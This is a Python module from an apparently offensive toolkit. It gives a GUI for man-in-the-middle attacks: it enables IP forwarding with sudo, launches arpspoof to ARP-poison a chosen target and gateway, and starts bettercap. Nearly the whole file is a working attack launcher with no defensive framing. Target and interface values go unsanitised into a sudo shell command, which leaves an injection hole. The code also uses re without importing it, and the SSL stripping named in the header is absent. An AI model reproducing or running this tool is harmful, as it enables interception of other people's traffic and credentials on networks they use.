# language: Python, file: modules/mitm.py
# Al-Baron MITM Module — ARP spoofing, sniffer, SSL strip
import customtkinter as ctk
import threading
import subprocess
import os
import time
from core.executor import ToolExecutor

class MITMModule:
    def __init__(self, log_queue):
        self.log = log_queue
        self.name = "mitm"
        self.executor = ToolExecutor(log_queue)
        self._parent = None
        self.out = None
        self.spoof_proc = None

    def render(self, parent):
        self._parent = parent
        ctk.CTkLabel(parent, text="MITM OPERATIONS", font=ctk.CTkFont(size=18, weight="bold"), text_color="#ffd700").pack(pady=(20, 4), padx=24, anchor="w")
        ctk.CTkLabel(parent, text="ARP poison · traffic sniff · SSL strip", font=ctk.CTkFont(size=11), text_color="#8a8a8a").pack(pady=(0, 12), padx=24, anchor="w")

        # Target config
        cfg = ctk.CTkFrame(parent, fg_color="#0d1319", corner_radius=6)
        cfg.pack(fill="x", padx=24)
        r = ctk.CTkFrame(cfg, fg_color="transparent")
        r.pack(fill="x", padx=12, pady=8)

        self.iface = ctk.CTkOptionMenu(r, values=self._get_ifaces(), width=100, fg_color="#1a2332", button_color="#1a2332")
        self.iface.pack(side="left", padx=(0, 6))

        self.target_ip = ctk.CTkEntry(r, placeholder_text="Target IP", width=140, height=32, fg_color="#05080c", border_color="#1a2332")
        self.target_ip.pack(side="left", padx=(0, 6))

        self.gateway_ip = ctk.CTkEntry(r, placeholder_text="Gateway IP", width=140, height=32, fg_color="#05080c", border_color="#1a2332")
        self.gateway_ip.pack(side="left", padx=(0, 6))

        ctk.CTkButton(r, text="⚔ START ARP POISON", width=160, height=32, fg_color="#4a1a1a", hover_color="#6b1a1a", text_color="#ff6b6b", command=self._start_arp_poison).pack(side="left", padx=(0, 6))
        ctk.CTkButton(r, text="◈ START BETTERCAP", width=160, height=32, fg_color="#2b2000", hover_color="#554400", text_color="#ffd700", command=self._start_bettercap).pack(side="left", padx=(0, 6))
        ctk.CTkButton(r, text="■ STOP ALL", width=120, height=32, fg_color="#141a22", hover_color="#1a2332", command=self._stop_all).pack(side="left")

        # Output
        ctk.CTkLabel(parent, text="Console Output:", font=ctk.CTkFont(size=12, weight="bold"), text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")
        self.out = ctk.CTkTextbox(parent, fg_color="#05080c", text_color="#ffd700", font=ctk.CTkFont(family="Consolas", size=10), height=450)
        self.out.pack(fill="both", expand=True, padx=24, pady=(0, 24))

    def _get_ifaces(self):
        try:
            out = subprocess.run(["ip", "-o", "link", "show"], capture_output=True, text=True).stdout
            ifaces = re.findall(r"\d+:\s+(\S+):", out)
            return [i for i in ifaces if i != "lo"] or ["eth0"]
        except Exception:
            return ["eth0"]

    def _start_arp_poison(self):
        iface = self.iface.get()
        target = self.target_ip.get().strip()
        gateway = self.gateway_ip.get().strip()

        if not target or not gateway:
            self._safe_out("[!] Target IP and Gateway IP required.")
            return

        self._safe_out(f"[*] Enabling IP forwarding...")
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)

        self._safe_out(f"[*] ARP Poisoning: {target} <-> {gateway} on {iface}...")
        
        # تشغيل arpspoof في نافذة منفصلة
        cmd = ["sudo", "x-terminal-emulator", "-e", f"arpspoof -i {iface} -t {target} {gateway}"]
        subprocess.Popen(cmd)
        self._safe_out("[+] ARP poison started in new window.")

    def _start_bettercap(self):
        iface = self.iface.get()
        self._safe_out(f"[*] Starting Bettercap on {iface}...")
        cmd = ["sudo", "x-terminal-emulator", "-e", f"bettercap -iface {iface}"]
        subprocess.Popen(cmd)

    def _stop_all(self):
        self._safe_out("[*] Stopping MITM processes...")
        subprocess.run(["sudo", "pkill", "arpspoof"], capture_output=True)
        subprocess.run(["sudo", "pkill", "bettercap"], capture_output=True)
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
        self._safe_out("[+] All MITM operations stopped.")

    def _safe_out(self, text):
        if not self._parent: return
        def _u():
            if self.out and self.out.winfo_exists():
                self.out.insert("end", text + "\n")
                self.out.see("end")
        self._parent.after(0, _u)
